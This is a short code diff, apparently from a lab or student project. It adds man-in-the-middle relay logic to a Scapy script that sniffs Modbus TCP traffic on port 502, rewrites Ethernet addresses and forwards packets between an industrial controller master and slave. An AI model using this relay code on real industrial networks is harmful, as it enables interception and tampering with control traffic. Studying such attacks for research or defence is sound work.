@@ -32,8 +32,42 @@ def handle_packet(packet):
     if not (packet.haslayer(TCP) and (packet[TCP].sport == 502 or packet[TCP].dport == 502)):
         return
     
-
+    # packets that are going throught MIM
+    if packet[Ether].dst == MIM_mac:
+        ## these destination is master 
+        if packet[Ether].src == slave_mac:
+            packet = packet_for_master(packet)
+        ## these destination is .252 
+        elif packet[Ether].src == real_master_mac:
+            packet = packet_for_slave(packet)
+        else:
+           return
     
+    # send packet 
+    sendp(packet, iface=listen_interface)
+    
+
+# Prepare packet that has master destination 
+def packet_for_master(packet):
+    
+    print("a")
+    
+    # change dst mac address to the real one 
+    packet[Ether].dst = real_master_mac
+    packet[Ether].src = MIM_mac 
+    
+    return packet 
+
+# prepare packet that has slave destination 
+def packet_for_slave(packet):
+    
+    print("hh")
+    
+    # change dst mac address to the real one 
+    packet[Ether].dst = slave_mac
+    packet[Ether].src = MIM_mac 
+    
+    return packet 
 
 # Start sniffing packets on the listen interface and call the handle_packet function for each packet received
 sniff(iface=listen_interface, prn=handle_packet)
